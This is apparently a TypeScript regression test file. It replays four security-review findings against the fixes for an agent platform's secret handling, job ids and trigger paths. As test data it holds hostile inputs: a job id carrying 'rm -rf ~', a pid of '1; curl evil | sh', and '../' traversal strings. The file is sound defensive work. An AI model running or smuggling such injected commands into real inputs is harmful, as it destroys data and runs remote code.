// The four security findings of the Fable review (private/reviews/
// 2026-11-10_fable-review.md, Nr. 1, 2, 9, 10), each replayed against
// the fix: the attack from the report must fail.
import './testing/isolated-home.mts';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const HOME = process.env.SOMORA_HOME!;

test('Nr. 1: the MCP child config (on the Claude Code command line) carries no key and no somora.env secret', async () => {
  writeFileSync(join(HOME, 'somora.env'), 'FAKE_SKILL_SECRET=hunter2\n', { mode: 0o600 });
  const { loadSomoraEnvFile, secretFreeEnv } = await import('./server/env-file.ts');
  loadSomoraEnvFile(join(HOME, 'somora.env'));
  process.env.SOMORA_KEY = 'key-that-must-not-leak';
  assert.equal(process.env.FAKE_SKILL_SECRET, 'hunter2', 'the server itself has the secret');
  const { somoraMemoryServerSpawn, somoraMcpProxySpawn } = await import('./mcp/config.ts');
  for (const spec of [somoraMemoryServerSpawn({ agent: 'ada', session: 's' }), somoraMcpProxySpawn({ server: 'x', agent: 'ada' })]) {
    const argv = JSON.stringify(spec);
    assert.ok(!argv.includes('key-that-must-not-leak'), 'no login key');
    assert.ok(!argv.includes('hunter2'), 'no somora.env secret');
    assert.equal(spec.env.SOMORA_HOME, HOME, 'what the child needs is still there');
  }
  const env = secretFreeEnv();
  assert.equal(env.SOMORA_KEY, undefined);
  assert.equal(env.FAKE_SKILL_SECRET, undefined);
  assert.equal(env.PATH, process.env.PATH);
});

test('Nr. 10: a local external agent starts without the key, the secrets and somora plumbing', async () => {
  process.env.SOMORA_KEY = 'key-that-must-not-leak';
  process.env.TSX_TSCONFIG_PATH = '/somora/tsconfig.json';
  const { externalAgentEnv } = await import('./external/transport.ts');
  const env = externalAgentEnv();
  assert.equal(env.SOMORA_KEY, undefined);
  assert.equal(env.FAKE_SKILL_SECRET, undefined);
  assert.equal(env.TSX_TSCONFIG_PATH, undefined);
  assert.equal(env.HOME, process.env.HOME);
});

test('Nr. 2: process job ids are checked; a forged meta.json is not believed', async () => {
  const { jobDir, readMeta, jobsDir, newJobId, isJobId } = await import('./tools/exec/job-store.ts');
  assert.ok(isJobId(newJobId()));
  for (const bad of ['../../bea/exec-jobs/job_1_abcd', 'job_1_abcd/../../x', 'job_1_abcd; rm -rf ~', '']) {
    assert.throws(() => jobDir('ada', bad), /invalid job id/, bad);
  }
  const { ProcessInput } = (await import('./tools/exec/tools.ts')) as unknown as { ProcessInput?: { safeParse(x: unknown): { success: boolean } } };
  if (ProcessInput) assert.equal(ProcessInput.safeParse({ action: 'kill', job_id: '../../bea/exec-jobs/job_1_abcd' }).success, false);

  const write = (id: string, meta: Record<string, unknown>) => {
    mkdirSync(join(jobsDir('ada'), id), { recursive: true });
    writeFileSync(join(jobsDir('ada'), id, 'meta.json'), JSON.stringify(meta));
  };
  const base = { agent: 'ada', target: 'lab', command: 'x', started_at: 1, state: 'running' };
  write('job_1_aaaa', { ...base, job_id: 'job_1_aaaa', pid: '1; curl evil | sh' });
  assert.equal(await readMeta('ada', 'job_1_aaaa'), null, 'a pid that is not a number never reaches a remote shell');
  write('job_2_bbbb', { ...base, job_id: 'job_2_bbbb', agent: 'bea', pid: 42 });
  assert.equal(await readMeta('ada', 'job_2_bbbb'), null, "another agent's record");
  write('job_3_cccc', { ...base, job_id: 'job_3_cccc', pid: 42 });
  assert.equal((await readMeta('ada', 'job_3_cccc'))?.pid, 42, 'a genuine record still reads');
});

test('Nr. 9: a trigger id never becomes a path outside sentinel/', async () => {
  const { assertTriggerIdSafe, getHistory } = await import('./sentinel/store.ts');
  assert.equal(assertTriggerIdSafe('daily-mail-x7k2'), 'daily-mail-x7k2');
  // A session file that the old path join would have reached:
  mkdirSync(join(HOME, 'agents', 'bea', 'sessions'), { recursive: true });
  writeFileSync(join(HOME, 'agents', 'bea', 'sessions', 'main.jsonl'), '{"kind":"user_message","text":"private"}\n');
  assert.deepEqual(await getHistory('../../agents/bea/sessions/main'), [], 'nothing read through ../');
  const { checkScriptDir } = await import('./sentinel/check-store.ts');
  assert.throws(() => checkScriptDir('../../agents'), /invalid trigger id/);
});
